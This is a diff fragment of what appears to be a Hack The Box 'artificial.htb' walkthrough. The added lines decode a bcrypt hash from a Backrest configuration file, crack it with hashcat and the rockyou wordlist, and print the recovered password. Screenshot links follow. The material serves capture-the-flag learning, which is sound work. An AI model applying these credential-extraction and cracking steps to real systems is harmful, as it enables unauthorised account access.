@@ -301,3 +301,24 @@ Hexada@hexada ~/pentest-env/vrm/artificial.htb/backrest/.config/backrest$ cat co
   }
 }
 ```
+
+```
+Hexada@hexada ~/pentest-env/vrm/artificial.htb/backrest/.config/backrest$ echo 'JDJhJDEwJGNWR0l5OVZNWFFkMGdNNWdpbkNtamVpMmtaUi9BQ01Na1Nzc3BiUnV0WVA1OEVCWnovMFFP' | base64 -d
+$2a$10$cVGIy9VMXQd0gM5ginCmjei2kZR/ACMMkSsspbRutYP58EBZz/0QO
+```
+
+```
+Hexada@hexada ~/pentest-env/vrm/artificial.htb$ hashcat -m 3200 hash2.txt /home/Hexada/pentest-env/pentesting-wordlists/SecLists/Passwords/Leaked-Databases/rockyou.txt -o password2.txt
+```
+
+```
+Hexada@hexada ~/pentest-env/vrm/artificial.htb$ cat password2.txt                                                                                                                    
+$2a$10$cVGIy9VMXQd0gM5ginCmjei2kZR/ACMMkSsspbRutYP58EBZz/0QO:!@#$%^
+```
+
+![image](https://github.com/user-attachments/assets/3362c3be-dd21-4d31-ac19-1306f97a77bf)
+
+![image](https://github.com/user-attachments/assets/ae3a205c-a0e5-4947-80f5-844263396991)
+
+![image](https://github.com/user-attachments/assets/354c32a2-5402-400c-89d3-5d5bd5a03099)
+
